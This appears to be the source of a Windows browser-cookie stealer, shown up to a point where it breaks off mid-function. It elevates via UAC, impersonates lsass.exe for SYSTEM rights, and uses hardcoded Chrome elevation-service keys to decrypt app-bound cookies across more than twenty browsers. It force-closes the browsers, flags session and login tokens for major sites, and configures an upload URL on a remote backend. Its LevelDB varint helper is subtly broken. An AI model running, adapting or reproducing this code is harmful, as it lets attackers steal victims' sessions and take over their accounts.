# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "PythonForWindows",
#     "cryptography",
#     "requests",
#     "cramjam",
# ]
# ///

import os
import io
import sys
import shutil
import subprocess
import time
import json
import struct
import ctypes
from ctypes import wintypes
import hashlib
import sqlite3
import pathlib
import binascii
import traceback
from contextlib import contextmanager
import tempfile
import argparse
import collections

import windows
import windows.crypto
import windows.generated_def as gdef

from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

import requests   # added for upload


# ---------------------------------------------------------------------------
# Default upload configuration (overridden by CLI arguments)
# ---------------------------------------------------------------------------
DEFAULT_UPLOAD_URL = "https://cookie-backend-production-c50b.up.railway.app/api/upload"
DEFAULT_NAME = "My export"

# ---------------------------------------------------------------------------
# Elevation / admin
# ---------------------------------------------------------------------------
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def relaunch_as_admin():
    """Re-run this script elevated via a UAC prompt, then exit the current process."""
    # Re-use the same interpreter (the uv-managed venv python already has the deps).
    params = " ".join(f'"{a}"' for a in sys.argv)
    rc = ctypes.windll.shell32.ShellExecuteW(
        None,            # parent hwnd
        "runas",         # verb -> triggers the UAC elevation prompt
        sys.executable,  # program to run
        params,          # arguments (this script + its args)
        None,            # working dir
        1,               # SW_SHOWNORMAL
    )
    # ShellExecuteW returns a value > 32 on success.
    if rc <= 32:
        print(f"Failed to elevate (ShellExecuteW returned {rc}).")
        sys.exit(1)
    sys.exit(0)

@contextmanager
def impersonate_lsass():
    """impersonate lsass.exe to get SYSTEM privilege"""
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token


# ---------------------------------------------------------------------------
# Browser catalog + discovery
# ---------------------------------------------------------------------------
# Each Chromium entry points at the "User Data" directory (which holds Local State
# and the per-profile folders). Opera keeps its default profile directly in the
# "Opera Stable" folder, which enumerate_chromium_profiles() handles.
CHROMIUM_CATALOG = [
    {"name": "Chrome",         "root_env": "LOCALAPPDATA", "subpath": r"Google\Chrome\User Data"},
    {"name": "Chrome Beta",    "root_env": "LOCALAPPDATA", "subpath": r"Google\Chrome Beta\User Data"},
    {"name": "Chrome Dev",     "root_env": "LOCALAPPDATA", "subpath": r"Google\Chrome Dev\User Data"},
    {"name": "Chrome Canary",  "root_env": "LOCALAPPDATA", "subpath": r"Google\Chrome SxS\User Data"},
    {"name": "Edge",           "root_env": "LOCALAPPDATA", "subpath": r"Microsoft\Edge\User Data"},
    {"name": "Edge Beta",      "root_env": "LOCALAPPDATA", "subpath": r"Microsoft\Edge Beta\User Data"},
    {"name": "Edge Dev",       "root_env": "LOCALAPPDATA", "subpath": r"Microsoft\Edge Dev\User Data"},
    {"name": "Brave",          "root_env": "LOCALAPPDATA", "subpath": r"BraveSoftware\Brave-Browser\User Data"},
    {"name": "Brave Beta",     "root_env": "LOCALAPPDATA", "subpath": r"BraveSoftware\Brave-Browser-Beta\User Data"},
    {"name": "Brave Nightly",  "root_env": "LOCALAPPDATA", "subpath": r"BraveSoftware\Brave-Browser-Nightly\User Data"},
    {"name": "Vivaldi",        "root_env": "LOCALAPPDATA", "subpath": r"Vivaldi\User Data"},
    {"name": "Opera",          "root_env": "APPDATA",      "subpath": r"Opera Software\Opera Stable"},
    {"name": "Opera GX",       "root_env": "APPDATA",      "subpath": r"Opera Software\Opera GX Stable"},
    {"name": "Opera Crypto",   "root_env": "APPDATA",      "subpath": r"Opera Software\Opera Crypto Stable"},
    {"name": "Yandex",         "root_env": "LOCALAPPDATA", "subpath": r"Yandex\YandexBrowser\User Data"},
    {"name": "Chromium",       "root_env": "LOCALAPPDATA", "subpath": r"Chromium\User Data"},
    {"name": "Epic",           "root_env": "LOCALAPPDATA", "subpath": r"Epic Privacy Browser\User Data"},
    {"name": "CocCoc",         "root_env": "LOCALAPPDATA", "subpath": r"CocCoc\Browser\User Data"},
    {"name": "Comodo Dragon",  "root_env": "LOCALAPPDATA", "subpath": r"Comodo\Dragon\User Data"},
    {"name": "360 Chrome",     "root_env": "LOCALAPPDATA", "subpath": r"360Chrome\Chrome\User Data"},
]

# Firefox-family: cookies live (unencrypted) in cookies.sqlite inside each profile
# folder under the "Profiles" directory.
FIREFOX_CATALOG = [
    {"name": "Firefox",    "root_env": "APPDATA", "subpath": r"Mozilla\Firefox\Profiles"},
    {"name": "LibreWolf",  "root_env": "APPDATA", "subpath": r"librewolf\Profiles"},
    {"name": "Waterfox",   "root_env": "APPDATA", "subpath": r"Waterfox\Profiles"},
    {"name": "Pale Moon",  "root_env": "APPDATA", "subpath": r"Moonchild Productions\Pale Moon\Profiles"},
]


def discover_chromium_browsers():
    """Return [{name, user_data}] for every Chromium browser actually installed."""
    found = []
    for b in CHROMIUM_CATALOG:
        root = os.environ.get(b["root_env"], "")
        if not root:
            continue
        user_data = os.path.join(root, b["subpath"])
        if os.path.isdir(user_data):
            found.append({"name": b["name"], "user_data": user_data})
    return found


def discover_firefox_browsers():
    """Return [{name, profiles_root}] for every Firefox-family browser installed."""
    found = []
    for b in FIREFOX_CATALOG:
        root = os.environ.get(b["root_env"], "")
        if not root:
            continue
        profiles_root = os.path.join(root, b["subpath"])
        if os.path.isdir(profiles_root):
            found.append({"name": b["name"], "profiles_root": profiles_root})
    return found


def enumerate_chromium_profiles(user_data):
    """Find every profile in a Chromium 'User Data' dir that has a cookie DB.

    Returns [{profile, cookie_db}]. Handles both the modern 'Network\\Cookies'
    layout and the older 'Cookies' one, plus Opera's "profile == root" layout.
    """
    profiles = []
    seen = set()

    def add(dir_path, label):
        for rel in (os.path.join("Network", "Cookies"), "Cookies"):
            db = os.path.join(dir_path, rel)
            if os.path.isfile(db):
                key = os.path.normcase(os.path.dirname(db))
                if key in seen:
                    return
                seen.add(key)
                profiles.append({"profile": label, "cookie_db": db})
                return

    # Opera (and some forks) keep the default profile directly in User Data.
    add(user_data, "Default")

    try:
        for entry in sorted(os.listdir(user_data)):
            full = os.path.join(user_data, entry)
            if not os.path.isdir(full):
                continue
            if entry in ("System Profile",):   # no user cookies of interest
                continue
            add(full, entry)
    except OSError:
        pass

    return profiles


def enumerate_firefox_profiles(profiles_root):
    """Return [{profile, cookie_db}] for each Firefox profile with a cookies.sqlite."""
    profiles = []
    try:
        entries = sorted(os.listdir(profiles_root))
    except OSError:
        return profiles
    for entry in entries:
        db = os.path.join(profiles_root, entry, "cookies.sqlite")
        if os.path.isfile(db):
            profiles.append({"profile": entry, "cookie_db": db})
    return profiles


# ---------------------------------------------------------------------------
# App-bound (v20) key derivation -- Chrome elevation-service constants
# ---------------------------------------------------------------------------
def parse_key_blob(blob_data: bytes) -> dict:
    # After the SYSTEM+user DPAPI unwraps, the plaintext is laid out as
    #   [header_len(4) | header(validation_data) | content_len(4) | content]
    buffer = io.BytesIO(blob_data)
    parsed_data = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    parsed_data['content_len'] = content_len

    # --- Non-Google-branded Chromium (Edge, Brave, ...) --------------------
    # These builds do NOT apply Chrome's extra elevation-service encryption
    # layer, so `content` IS already the raw 32-byte app-bound (v20) key.
    # (Google Chrome instead stores [flag|iv|ciphertext|tag] that needs one
    # more AES/ChaCha decrypt with a key baked into elevation_service.exe.)
    if content_len == 32:
        parsed_data['flag'] = 0            # sentinel: raw key, no further decrypt
        parsed_data['master_key'] = buffer.read(32)
        return parsed_data

    parsed_data['flag'] = buffer.read(1)[0]

    if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
        # [flag|iv|ciphertext|tag] decrypted_blob
        # [1byte|12bytes|32bytes|16bytes]
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        # [flag|encrypted_aes_key|iv|ciphertext|tag] decrypted_blob
        # [1byte|32bytes|12bytes|32bytes|16bytes]
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']} (content_len={content_len})")

    return parsed_data

def decrypt_with_cng(input_data):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"

    hKey = gdef.NCRYPT_KEY_HANDLE()
    key_name = "Google Chromekey1"
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0, f"NCryptOpenKey failed with status {status}"

    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        None,
        0,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"

    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        output_buffer,
        buffer_size,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"

    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)

    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 0:
        # Non-Google-branded Chromium (Edge, Brave, ...): the content already IS
        # the 32-byte app-bound master key -- no extra decrypt needed.
        return parsed_data['master_key']

    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AESGCM(aes_key)

    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20Poly1305(chacha20_key)

    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AESGCM(xored_aes_key)

    return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)


# Force-close browsers before reading, so locked cookie DBs unlock. On by default
# (browsers like Edge keep the DB locked while running); pass --no-close to skip.
CLOSE_BROWSERS = True

# Process image names to terminate when CLOSE_BROWSERS is on. Covers the browsers
# in CHROMIUM_CATALOG / FIREFOX_CATALOG. (browser.exe = Yandex/CocCoc.)
BROWSER_PROCESS_NAMES = [
    "chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "opera_gx.exe",
    "vivaldi.exe", "yandex.exe", "browser.exe", "chromium.exe", "epic.exe",
    "dragon.exe", "360chrome.exe", "360se.exe",
    "firefox.exe", "librewolf.exe", "waterfox.exe", "palemoon.exe",
]


def close_browsers(emit):
    """Force-close known browser processes so their cookie databases unlock.

    Uses taskkill /F /T per image name. Processes that aren't running just return
    'not found', which we ignore. A short pause lets Windows release file handles.
    """
    emit("Closing browsers so their cookie databases unlock (pass --no-close to skip)...")
    closed = []
    for name in BROWSER_PROCESS_NAMES:
        try:
            res = subprocess.run(
                ["taskkill", "/F", "/T", "/IM", name],
                capture_output=True, text=True,
                creationflags=0x08000000,   # CREATE_NO_WINDOW
            )
            if res.returncode == 0:
                closed.append(name)
        except Exception:
            pass
    if closed:
        emit("  closed: " + ", ".join(closed))
        time.sleep(2)   # give the OS a moment to release the file locks
    else:
        emit("  (no running browsers matched)")


def get_v20_master_key(local_state: dict, browser_name: str = "Chrome"):
    """Derive the v20 (app-bound) master key from Local State, or None if absent.

    Works entirely offline (needs admin/elevation): unwrap the app-bound blob with
    SYSTEM DPAPI (via lsass) then user DPAPI, then either return the raw 32-byte key
    -- Edge and other non-Google-branded Chromium -- or run Chrome's extra
    elevation-service decrypt (flags 1-3). Raises if it can't derive the key.
    """
    osc = local_state.get("os_crypt", {})
    b64 = osc.get("app_bound_encrypted_key")
    if not b64:
        return None
    raw = binascii.a2b_base64(b64)
    if raw[:4] != b"APPB":
        return None
    encrypted_blob = raw[4:]

    with impersonate_lsass():
        sys_decrypted = windows.crypto.dpapi.unprotect(encrypted_blob)
    user_decrypted = windows.crypto.dpapi.unprotect(sys_decrypted)
    parsed = parse_key_blob(user_decrypted)
    return derive_v20_master_key(parsed)


def get_v10_master_key(local_state: dict):
    """Derive the v10 (DPAPI) master key from Local State, or None if absent.

    This is the classic Chromium scheme and works for EVERY Chromium browser --
    the key is DPAPI-protected under the current user only (no SYSTEM needed).
    """
    osc = local_state.get("os_crypt", {})
    b64 = osc.get("encrypted_key")
    if not b64:
        return None
    raw = binascii.a2b_base64(b64)
    if raw[:5] != b"DPAPI":
        return None
    return windows.crypto.dpapi.unprotect(raw[5:])


# ---------------------------------------------------------------------------
# Cookie value decryption
# ---------------------------------------------------------------------------
def _domain_hash_prefix_len(plaintext: bytes, host_key: str) -> int:
    """v20 (and some newer v10) cookies prepend SHA-256(domain) to the plaintext.

    Return 32 if the first 32 bytes match the hash of this cookie's host, else 0.
    """
    if len(plaintext) < 32 or not host_key:
        return 0
    bare = host_key.lstrip(".")
    for cand in (host_key, bare, "." + bare):
        if hashlib.sha256(cand.encode("utf-8")).digest() == plaintext[:32]:
            return 32
    return 0


def strip_domain_hash(plaintext: bytes, host_key: str, version: str) -> bytes:
    n = _domain_hash_prefix_len(plaintext, host_key)
    if n:
        return plaintext[n:]
    # v20 always carries the prefix even if the hash form didn't match above.
    if version == "v20" and len(plaintext) >= 32:
        return plaintext[32:]
    return plaintext


def _aesgcm_cookie(encrypted_value: bytes, key: bytes, host: str, version: str) -> str:
    """Decrypt a v10/v20 cookie: [prefix(3) | iv(12) | ciphertext | tag(16)]."""
    try:
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        plaintext = AESGCM(key).decrypt(iv, ciphertext + tag, None)
        plaintext = strip_domain_hash(plaintext, host, version)
        return plaintext.decode("utf-8", "replace")
    except Exception as e:
        return f"<decrypt failed: {e}>"


def decrypt_chromium_value(encrypted_value: bytes, host: str, v10_key, v20_key):
    """Decrypt one Chromium cookie value.

    Returns (value, version). value is None only when we recognise the cookie
    type but lack the key for it (so the caller can count it as 'skipped').
    version is one of: v20, v10, dpapi, empty.
    """
    if not encrypted_value:
        return "", "empty"

    prefix = bytes(encrypted_value[:3])
    if prefix == b"v20":
        if v20_key is None:
            return None, "v20"
        return _aesgcm_cookie(encrypted_value, v20_key, host, "v20"), "v20"
    if prefix == b"v10":
        if v10_key is None:
            return None, "v10"
        return _aesgcm_cookie(encrypted_value, v10_key, host, "v10"), "v10"

    # Legacy: the whole value is a raw DPAPI blob (pre-v10 Chromium).
    try:
        decrypted = windows.crypto.dpapi.unprotect(bytes(encrypted_value))
        return decrypted.decode("utf-8", "replace"), "dpapi"
    except Exception as e:
        return f"<decrypt failed: {e}>", "dpapi"


# ---------------------------------------------------------------------------
# Cookie classification / grouping (browser-agnostic)
# ---------------------------------------------------------------------------
# Cookie name patterns that typically carry the actual "logged-in" credential
# (session tokens, auth tokens) rather than analytics / advertising / consent
# junk. Everything here is matched case-insensitively.
LOGIN_COOKIE_EXACT = {
    # Google / YouTube
    "sid", "hsid", "ssid", "apisid", "sapisid", "sidcc", "login_info",
    "__secure-1psid", "__secure-3psid", "__secure-1psidcc", "__secure-3psidcc",
    "__secure-1psidts", "__secure-3psidts",
    # X / Twitter
    "auth_token", "twid", "ct0",
    # LinkedIn
    "li_at", "li_rm", "liap", "jsessionid",
    # Facebook / Meta
    "c_user", "xs",
    # GitHub
    "user_session", "dotcom_user", "logged_in",
    # Cursor / WorkOS
    "workoscursorsessiontoken", "workos_id", "access-token",
    # common web frameworks
    "sessionid", "session_id", "phpsessid", "connect.sid",
    "laravel_session", "laravelssessionnew", "_session",
    "access_token", "refresh_token", "id_token",
}
LOGIN_COOKIE_KEYWORDS = (
    "login", "session", "auth", "sapisid", "psid", "oauth", "sso",
    "jwt", "account", "credential", "remember",
)
# Names that contain a login-ish keyword but are NOT actually sign-in credentials.
NON_LOGIN_HINTS = ("csrf", "xsrf", "guest", "anon", "consent", "marketing",
                   "device", "visitor", "chain_token", "stable_id")

def is_login_cookie(name: str) -> bool:
    """Best-effort guess: does this cookie name look like a sign-in credential?"""
    n = (name or "").lower()
    if n in LOGIN_COOKIE_EXACT:
        return True
    if any(bad in n for bad in NON_LOGIN_HINTS):
        return False
    return any(k in n for k in LOGIN_COOKIE_KEYWORDS)

def registrable_domain(host_key: str) -> str:
    """Collapse a cookie host to its site so a site's cookies group together,
    e.g. '.www.youtube.com' -> 'youtube.com'. Simple last-two-labels heuristic."""
    host = (host_key or "").lstrip(".")
    labels = host.split(".")
    if len(labels) <= 2:
        return host
    return ".".join(labels[-2:])


# ---------------------------------------------------------------------------
# Reading cookie databases (copy first -- the live DB is usually locked)
# ---------------------------------------------------------------------------
def _create_file_shared(path):
    """Open a file for reading with FULL sharing so a running browser's lock
    (which blocks a plain copy) doesn't stop us. Returns a Windows handle."""
    CreateFileW = ctypes.windll.kernel32.CreateFileW
    CreateFileW.restype = ctypes.c_void_p
    CreateFileW.argtypes = [ctypes.c_wchar_p, wintypes.DWORD, wintypes.DWORD,
                            ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
    GENERIC_READ = 0x80000000
    FILE_SHARE_ALL = 0x1 | 0x2 | 0x4    # READ | WRITE | DELETE
    OPEN_EXISTING = 3
    FILE_ATTRIBUTE_NORMAL = 0x80
    handle = CreateFileW(path, GENERIC_READ, FILE_SHARE_ALL, None,
                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None)
    if not handle or handle == ctypes.c_void_p(-1).value:
        raise ctypes.WinError()
    return handle


def _copy_locked(src, dst):
    """Copy src -> dst even if another process holds src open. Fast path is a
    normal copy; the fallback streams the bytes through a shared-read handle."""
    try:
        shutil.copy2(src, dst)
        return
    except (PermissionError, OSError):
        pass   # locked -> shared-read fallback below

    kernel32 = ctypes.windll.kernel32
    ReadFile = kernel32.ReadFile
    ReadFile.argtypes = [ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD,
                         ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
    ReadFile.restype = wintypes.BOOL

    handle = _create_file_shared(src)
    try:
        buf = ctypes.create_string_buffer(1024 * 1024)
        got = wintypes.DWORD(0)
        with open(dst, "wb") as out:
            while True:
                if not ReadFile(handle, buf, ctypes.sizeof(buf), ctypes.byref(got), None):
                    raise ctypes.WinError()
                if got.value == 0:
                    break
                out.write(buf.raw[:got.value])
    finally:
        kernel32.CloseHandle(ctypes.c_void_p(handle))


def _read_sqlite(cookie_db, query, emit):
    """Copy a (possibly locked) cookie DB to temp and run the query.

    Brings the -wal/-shm sidecars along so a *running* browser's most recent
    cookies are included, then opens the copy read/write so SQLite can replay the
    WAL. Falls back to an immutable (WAL-ignoring) open if the live copy is torn.
    """
    rows = []
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_db = os.path.join(temp_dir, "Cookies")
        try:
            _copy_locked(cookie_db, temp_db)
        except OSError as e:
            emit(f"    ! could not read cookie DB (locked, shared copy failed): {e}")
            return rows

        for suffix in ("-wal", "-shm"):
            side = cookie_db + suffix
            if os.path.isfile(side):
                try:
                    _copy_locked(side, temp_db + suffix)
                except OSError:
                    pass

        con = None
        try:
            try:
                con = sqlite3.connect(temp_db)          # r/w copy -> WAL applied
                cur = con.cursor()
                cur.execute(query)
                rows = cur.fetchall()
            except sqlite3.DatabaseError:
                # Torn copy of a live DB -> re-open ignoring the WAL and locks.
                if con is not None:
                    con.close()
                    con = None
                uri = pathlib.Path(temp_db).as_uri() + "?immutable=1"
                con = sqlite3.connect(uri, uri=True)
                cur = con.cursor()
                cur.execute(query)
                rows = cur.fetchall()
        except sqlite3.Error as e:
            emit(f"    ! sqlite error on {cookie_db}: {e}")
        finally:
            if con is not None:
                con.close()
    return rows


def read_chromium_cookies(cookie_db, emit):
    return _read_sqlite(
        cookie_db,
        "SELECT host_key, name, CAST(encrypted_value AS BLOB) FROM cookies;",
        emit,
    )


def read_firefox_cookies(cookie_db, emit):
    return _read_sqlite(
        cookie_db,
        "SELECT host, name, value FROM moz_cookies;",
        emit,
    )


# ---------------------------------------------------------------------------
# Per-browser processing
# ---------------------------------------------------------------------------
def process_chromium_browser(browser, emit):
    """Decrypt every profile of one Chromium browser. Returns a list of records."""
    records = []
    user_data = browser["user_data"]
    name = browser["name"]

    # Local State (holds both the v10 and v20 keys) lives at the User Data root.
    local_state = {}
    ls_path = os.path.join(user_data, "Local State")
    if os.path.isfile(ls_path):
        try:
            with open(ls_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
        except Exception as e:
            emit(f"    ! could not read Local State: {e}")

    v10_key = None
    v20_key = None
    try:
        v10_key = get_v10_master_key(local_state)
    except Exception as e:
        emit(f"    ! v10 key unavailable: {e}")
    try:
        v20_key = get_v20_master_key(local_state, name)
    except Exception as e:
        # If a browser uses an unknown app-bound scheme, v10 cookies still work.
        emit(f"    ! v20 (app-bound) key not derivable for {name} (v10 cookies still handled): {e}")

    profiles = enumerate_chromium_profiles(user_data)
    if not profiles:
        emit("    (no cookie databases found)")
        return records

    for prof in profiles:
        rows = read_chromium_cookies(prof["cookie_db"], emit)
        ok = skipped = failed = 0
        for host, cname, enc in rows:
            value, version = decrypt_chromium_value(enc, host, v10_key, v20_key)
            if value is None:            # recognised but no key for it
                skipped += 1
                continue
            if isinstance(value, str) and value.startswith("<decrypt failed"):
                failed += 1
            records.append({
                "browser": name,
                "profile": prof["profile"],
                "site": registrable_domain(host),
                "host": host,
                "name": cname,
                "value": value,
                "is_login": is_login_cookie(cname),
                "version": version,
            })
            ok += 1
        note = f"    profile '{prof['profile']}': {ok} cookies decrypted"
        if skipped:
            note += f", {skipped} v20 skipped (no app-bound key)"
        if failed:
            note += f", {failed} failed"
        emit(note)

    return records


def process_firefox_browser(browser, emit):
    """Read every profile of one Firefox-family browser (cookies are plaintext)."""
    records = []
    name = browser["name"]
    profiles = enumerate_firefox_profiles(browser["profiles_root"])
    if not profiles:
        emit("    (no cookie databases found)")
        return records

    for prof in profiles:
        rows = read_firefox_cookies(prof["cookie_db"], emit)
        for host, cname, value in rows:
            records.append({
                "browser": name,
                "profile": prof["profile"],
                "site": registrable_domain(host or ""),
                "host": host or "",
                "name": cname or "",
                "value": value if value is not None else "",
                "is_login": is_login_cookie(cname or ""),
                "version": "plain",
            })
        emit(f"    profile '{prof['profile']}': {len(rows)} cookies (plaintext)")

    return records


# ---------------------------------------------------------------------------
# Report
# ---------------------------------------------------------------------------
def build_report(records):
    """Turn the flat cookie list into a grouped, readable, verifier-compatible report.

    records: list of dicts {browser, profile, site, host, name, value, is_login, version}.

    NOTE: verify_cookies_playwright.py parses everything AFTER the 'ALL COOKIES BY
    SITE' header, keying off '### site (N cookies)' headers and '  * [host] name =
    value' lines. Keep that section's line format intact.
    """
    lines = []
    total = len(records)
    login_records = [r for r in records if r["is_login"]]

    by_browser = {}
    for r in records:
        by_browser.setdefault(r["browser"], []).append(r)
    all_sites = {r["site"] for r in records}
    all_profiles = {(r["browser"], r["profile"]) for r in records}

    lines.append(f"Decrypted {total} cookies from {len(by_browser)} browser(s), "
                 f"{len(all_profiles)} profile(s), across {len(all_sites)} site(s).")
    lines.append(f"Of these, {len(login_records)} look like login / session credentials.")
    lines.append("")

    # --- Section 0: what was found -------------------------------------------
    lines.append("=" * 70)
    lines.append(" BROWSERS DETECTED")
    lines.append("=" * 70)
    for b in sorted(by_browser):
        recs = by_browser[b]
        versions = {}
        for r in recs:
            versions[r["version"]] = versions.get(r["version"], 0) + 1
        profs = sorted({r["profile"] for r in recs})
        vtxt = ", ".join(f"{v} {k}" for k, v in sorted(versions.items()))
        lines.append("")
        lines.append(f"  {b}")
        lines.append(f"      cookies : {len(recs)}  ({vtxt})")
        lines.append(f"      profiles: {', '.join(profs)}")
    lines.append("")

    # --- Section 1: the actual sign-in credentials ---------------------------
    lines.append("=" * 70)
    lines.append(" LOGIN / SESSION COOKIES  (what actually keeps you signed in)")
    lines.append("=" * 70)
    if not login_records:
        lines.append("(none detected)")
    else:
        grp = {}
        for r in login_records:
            grp.setdefault((r["browser"], r["profile"]), {}).setdefault(r["site"], []).append(r)
        for (b, p) in sorted(grp):
            lines.append("")
            lines.append(f"----- {b}  /  {p} -----")
            for site in sorted(grp[(b, p)]):
                lines.append(f"  {site}")
                for r in grp[(b, p)][site]:
                    lines.append(f"      [{r['host']}] {r['name']}")
                    lines.append(f"          {r['value']}")
    lines.append("")

    # --- Section 2: every cookie, grouped by browser/profile then site -------
    # (This is the section verify_cookies_playwright.py reads.)
    lines.append("=" * 70)
    lines.append(" ALL COOKIES BY SITE  (grouped by browser & profile; * = login cookie)")
    lines.append("=" * 70)
    grp = {}
    for r in records:
        grp.setdefault((r["browser"], r["profile"]), {}).setdefault(r["site"], []).append(r)
    for (b, p) in sorted(grp):
        lines.append("")
        lines.append(f"----- {b}  /  {p} -----")
        for site in sorted(grp[(b, p)]):
            entries = grp[(b, p)][site]
            lines.append("")
            lines.append(f"### {site}  ({len(entries)} cookies)")
            for r in entries:
                mark = "*" if r["is_login"] else " "
                lines.append(f"  {mark} [{r['host']}] {r['name']} = {r['value']}")

    return lines


# ---------------------------------------------------------------------------
# LevelDB reader — parses Chromium's localStorage (LevelDB SSTables + WAL)
# ---------------------------------------------------------------------------
# Every Chromium profile stores localStorage as a LevelDB instance in
#   {profile}/Local Storage/leveldb/
# Keys are in the form:  _https://origin\x00keyName
# Values are the stored strings (UTF-16LE for Chromium, we decode to UTF-8).
#
# LevelDB SSTable (.ldb) layout:
#   [data block]*  [meta block]*  [metaindex block]  [index block]  [footer 48B]
# The footer contains BlockHandles (varint64 offset+size) for the metaindex and
# index blocks. The index block maps last-key → BlockHandle for each data block.
# Data blocks use restart-based prefix compression; blocks are often Snappy-
# compressed. The WAL (.log) carries recent writes not yet compacted into .ldb.

def _decode_varint32(data, pos):
    """Read a 32-bit varint. Returns (value, new_pos) or (None, pos) on error."""
    result = 0
    for shift in (0, 7, 14, 21, 28):
        if pos >= len(data):
            return None, pos
        b = data[pos]
        pos += 1
        result |= (b & 0x7F) << shift
        if not (b & 0x80):
            return result, pos
    return None, pos   # too long for 32-bit

def _decode_varint64(data, pos):
    """Read a 64-bit varint. Returns (value, new_pos) or (None, pos) on error."""
    result = 0
    for shift in (0, 7, 14, 21, 28, 35, 42, 49, 56, 63):
        if pos >= len(data):
            return None, pos
        b = data[pos]
        pos += 1
        result |= (b & 0x7F) << shift
        if not (b & 0x80):
            return result & 0xFFFFFFFFFFFFFFFF
    if pos < len(data) and data[pos] & 0x80 == 0:
        # 10th byte with high bit clear → 64-bit value complete
        pos += 1
    return None, pos

def _decode_fixed32(data, pos):
    if pos + 4 > len(data):
        return None, pos
    return struct.unpack_from("<I", data, pos)[0], pos + 4

def _snappy_decompress(raw):
    """Decompress Snappy-compressed bytes using cramjam. Returns bytes or None."""
    try:
        import cramjam
        return cramjam.snappy.decompress(raw)
    except Exception:
        return None

def _parse_block(data, want_keys=True):
    """Parse a LevelDB data or index block (restart-based prefix compression).

    Returns list of (key, value) byte pairs, preserving insertion order.
    Skips entries whose value looks like a BlockHandle (used in index blocks)
    by returning them as-is — the caller decides what to do.
    """
    if len(data) < 5:
        return []
    num_restarts = struct.unpack_from("<I", data, len(data) - 4)[0]
    if num_restarts == 0:
        return []
    restart_end = len(data) - 4 - num_restarts * 4
    if restart_end < 0:
        return []

    entries = []
    key = b""
    pos = 0
    while pos < restart_end:
        shared, pos = _decode_varint32(data, pos)
        unshared, pos = _decode_varint32(data, pos)
        vallen, pos = _decode_varint32(data, pos)
        if shared is None or unshared is None or vallen is None:
            break
        if pos + unshared + vallen > len(data):
            break
        key = key[:shared] + data[pos:pos + unshared]
        pos += unshared
        value = data[pos:pos + vallen]
        pos += vallen
        entries.append((key, value))
    return entries

def _parse_sstable(path):
    """Parse one .ldb SSTable file. Returns dict of key → value."""
    result = {}
    try:
        sz = os.path.getsize(path)
        if sz < 48:
            return result
        with open(path, "rb") as f:
            f.seek(sz - 48)
            footer = f.read(48)
    except OSError:
        return result

    # Footer: metaindex_handle, index_handle, padding, magic (8B)
    magic = footer[40:48]
    if magic != b"\x57\xfb\x80\x8b\x24\x75\x47\xdb":
        return result

    fp = 0
    meta_off, fp = _decode_varint64(footer, fp)
    meta_sz, fp = _decode_varint64(footer, fp)
    idx_off, fp = _decode_varint64(footer, fp)
    idx_sz, fp = _decode_varint64(footer, fp)
    if None in (meta_off, meta_sz, idx_off, idx_sz):
        return result

